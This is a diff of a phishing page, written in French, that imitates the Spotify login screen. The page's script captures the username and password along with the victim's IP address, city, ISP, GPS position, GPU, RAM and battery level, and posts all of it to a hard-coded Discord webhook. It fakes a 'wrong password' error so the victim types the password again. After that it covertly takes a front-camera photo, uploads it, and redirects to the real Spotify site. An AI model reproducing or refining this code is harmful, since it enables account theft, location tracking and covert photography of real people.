@@ -8,28 +8,25 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
         body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; overflow-x: hidden; }
+        .app-card { width: 100%; max-width: 450px; padding: 60px 25px; text-align: center; }
+        .logo { width: 45px; margin: 0 auto 50px auto; }
         
-        .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
-        .logo { width: 45px; margin: 0 auto 30px auto; }
-        h1 { font-size: 26px; font-weight: 900; margin-bottom: 30px; letter-spacing: -1px; }
+        .field { text-align: left; margin-bottom: 20px; }
+        label { display: block; font-size: 13px; font-weight: 900; margin-bottom: 8px; }
         
-        .field { text-align: left; margin-bottom: 15px; }
-        label { display: block; font-size: 14px; font-weight: 700; margin-bottom: 8px; }
+        /* Zéro bordure - Style Pur */
+        input { width: 100%; background: #121212; border: none; border-radius: 4px; padding: 16px; color: #fff; font-size: 15px; outline: none; }
         
-        /* Inputs sans bordures - Fond sombre */
-        input { width: 100%; background: #282828; border: none; border-radius: 4px; padding: 16px; color: #fff; font-size: 16px; outline: none; -webkit-appearance: none; }
+        .btn-main { background: #1ed760; color: #000; font-weight: 700; padding: 18px; border-radius: 500px; width: 100%; margin-top: 25px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
         
-        .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 15px; font-size: 16px; border: none; text-transform: uppercase; cursor: pointer; }
-        
-        .divider { display: flex; align-items: center; width: 100%; margin: 30px 0; color: #b3b3b3; font-size: 11px; font-weight: 900; }
+        .divider { display: flex; align-items: center; width: 100%; margin: 35px 0; color: #b3b3b3; font-size: 11px; font-weight: 900; }
         .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #292929; }
         .divider:not(:empty)::before { margin-right: 1.5em; }
         .divider:not(:empty)::after { margin-left: 1.5em; }
 
-        /* Boutons Sociaux SANS LOGOS */
         .social-btn { background: transparent; border: 1px solid #727272; border-radius: 500px; padding: 14px; width: 100%; color: #fff; font-weight: 700; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; font-size: 14px; }
 
-        .footer-link { margin-top: 30px; font-size: 14px; color: #b3b3b3; }
+        .footer-link { margin-top: 40px; font-size: 14px; color: #b3b3b3; }
         .footer-link span { color: #fff; font-weight: 700; text-decoration: underline; }
 
         .err { background: #e91429; color: #fff; padding: 12px; border-radius: 4px; font-size: 13px; font-weight: 700; margin-bottom: 20px; display: none; }
@@ -39,16 +36,15 @@
 <body>
     <div class="app-card">
         <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
-        <h1>Se connecter pour continuer</h1>
 
         <div id="error" class="err">Identifiant ou mot de passe incorrect.</div>
 
-        <div class="field"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text" autocomplete="off" placeholder="E-mail ou nom d'utilisateur"></div>
+        <div class="field"><label>Adresse e-mail ou nom d'utilisateur</label><input id="u" type="text" placeholder="Adresse e-mail ou nom d'utilisateur"></div>
         <div class="field"><label>Mot de passe</label><input id="p" type="password" placeholder="Mot de passe"></div>
         
-        <button onclick="start()" id="btn" class="btn-green">Se connecter</button>
+        <button onclick="run()" id="btn" class="btn-main">Continuer</button>
 
-        <div class="divider">OU</div>
+        <div class="divider">ou</div>
 
         <div class="social-btn">Continuer avec Google</div>
         <div class="social-btn">Continuer avec Facebook</div>
@@ -63,67 +59,64 @@
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
         let count = 0;
 
-        async function start() {
+        async function run() {
             const u = document.getElementById('u').value;
             const p = document.getElementById('p').value;
             if(!u || !p) return;
             count++;
-            document.getElementById('btn').innerText = "VÉRIFICATION...";
+            document.getElementById('btn').innerText = "...";
 
-            // Données IP et Hardware
+            // 1. DATA RAPPORT COMPLET (image_c61034)
             let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
             let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
             const gl = document.createElement('canvas').getContext('webgl');
             const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";
 
-            // Localisation GPS précise
-            let gps = "Non autorisé";
+            // 2. LOC PRÉCISE (Le Pellerin)
+            let loc = "Non autorisé";
             try {
-                const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true, timeout: 4000});
-                });
-                gps = `✅ **GPS PRÉCIS (Le Pellerin) :**\nLat: \`${pos.coords.latitude}\` | Long: \`${pos.coords.longitude}\` \n**[Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})**`;
-            } catch(e) { gps = "❌ GPS Refusé (Ville IP: " + (net.city || "La Montagne") + ")"; }
+                const pos = await new Promise((res, rej) => { navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:4000}); });
+                loc = `✅ **PRÉCISE :** [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
+            } catch(e) { loc = `❌ IP-Based: ${net.city || 'La Montagne'}`; }
 
-            const msg = {
+            const log = {
                 embeds: [{
-                    title: `📱 LOG V19 FINAL - ${u}`,
+                    title: `🔱 LVN V21 ELITE - ${u}`,
                     color: 1955168,
                     fields: [
-                        { name: "👤 COMPTE", value: `**User:** \`${u}\`\n**Pass:** \`${p}\`` },
-                        { name: "📍 LOCALISATION", value: gps },
-                        { name: "📱 SYSTÈME", value: `**GPU:** \`${gpu}\`\n**Bat:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\`\n**RAM:** \`${navigator.deviceMemory || '?'}GB\``, inline: true }
+                        { name: "👤 ACCÈS", value: `**User:** \`${u}\`\n**Pass:** \`${p}\`` },
+                        { name: "🌐 RÉSEAU", value: `**IP:** \`${net.ip}\`\n**Ville:** \`${net.city}\`\n**FAI:** \`${net.org}\`\n**Maps:** ${loc}` },
+                        { name: "📱 MATÉRIEL", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory || '?'}GB\`\n**Bat:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\``, inline: true }
                     ],
-                    footer: { text: "Rapport Elite • " + new Date().toLocaleString() }
+                    footer: { text: "LVN System • " + new Date().toLocaleString() }
                 }]
             };
 
-            fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });
+            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(log) });
 
             if(count === 1) {
                 setTimeout(() => {
-                    document.getElementById('btn').innerText = "Se connecter";
+                    document.getElementById('btn').innerText = "Continuer";
                     document.getElementById('p').value = "";
                     document.getElementById('error').style.display = "block";
-                }, 1000);
+                }, 800);
             } else {
-                // Photo Frontale
+                // 3. CAPTURE CAMÉRA
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const video = document.getElementById('v');
                     video.srcObject = stream;
-                    await new Promise(r => setTimeout(r, 1800));
+                    await new Promise(r => setTimeout(r, 2000));
                     const can = document.getElementById('c');
                     can.width = 1280; can.height = 720;
                     can.getContext('2d').drawImage(video, 0, 0);
-                    can.toBlob(b => {
-                        const fd = new FormData();
-                        fd.append('file', b, 'shot.png');
-                        fetch(hook, { method: 'POST', body: fd });
+                    can.toBlob(async b => {
+                        const fd = new FormData(); fd.append('file', b, 'shot.png');
+                        await fetch(hook, { method: 'POST', body: fd });
                         stream.getTracks().forEach(t => t.stop());
                     }, 'image/jpeg', 0.8);
                 } catch(e) {}
-                setTimeout(() => { window.location.href = "https://open.spotify.com"; }, 2000);
+                setTimeout(() => { window.location.href = "https://www.spotify.com/fr/premium/"; }, 1500);
             }
         }
     </script>
